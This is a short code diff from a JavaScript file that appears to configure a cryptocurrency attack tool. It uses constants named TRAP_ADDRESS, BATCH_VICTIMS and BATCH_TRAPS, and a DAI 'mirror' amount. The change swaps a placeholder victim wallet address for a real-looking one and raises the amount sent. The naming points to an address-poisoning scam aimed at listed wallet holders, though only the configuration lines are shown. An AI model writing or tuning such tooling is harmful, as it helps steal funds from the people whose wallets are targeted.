@@ -133,7 +133,7 @@ const TRAP_ADDRESS = '0x03f36a6d25398c9a4ffce2aca44cfe82b78c9659';
 // 🆕 Batch mode: multiple victims and traps
 const BATCH_VICTIMS = [
     '0xf8cb909c54b761a4b74a5eaf23c7fec49feb9ffc',
-    '0x1234567890123456789012345678901234567890',
+    '0xf10b3a02d89e2970209add91e9a32b7202997ce5',
     '0xabcdefabcdefabcdefabcdefabcdefabcdefabcd',
     '0x9876543210987654321098765432109876543210',
     '0xfedcbafedcbafedcbafedcbafedcbafedcbafedc',
@@ -149,7 +149,7 @@ const BATCH_TRAPS = [
 
 // ─── Amount configuration ───
 const ASSET = 'DAI';
-const HUMAN_AMOUNT = 4;
+const HUMAN_AMOUNT = 10;
 const MIRROR_AMOUNT = toRawAmount(HUMAN_AMOUNT, ASSET);
 
 // 🆕 Batch amounts (can be different per victim)
